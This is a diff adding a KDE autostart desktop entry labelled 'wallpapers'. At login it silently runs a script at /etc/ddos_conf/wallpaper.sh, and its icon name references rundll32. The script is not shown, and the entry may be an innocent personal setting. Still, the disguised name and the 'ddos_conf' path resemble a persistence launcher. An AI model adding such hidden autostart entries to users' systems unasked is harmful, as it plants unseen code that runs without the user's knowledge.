@@ -1,0 +1,21 @@
+#!/usr/bin/env xdg-open
+[Desktop Entry]
+Comment[ru_RU]=
+Comment=
+Exec=/etc/ddos_conf/wallpaper.sh
+GenericName[ru_RU]=
+GenericName=
+Icon=1CD8_rundll32.0
+MimeType=
+Name[ru_RU]=wallpapers
+Name=wallpapers
+Path=
+StartupNotify=true
+Terminal=false
+TerminalOptions=
+Type=Application
+X-DBUS-ServiceName=
+X-DBUS-StartupType=
+X-KDE-AutostartScript=true
+X-KDE-SubstituteUID=false
+X-KDE-Username=
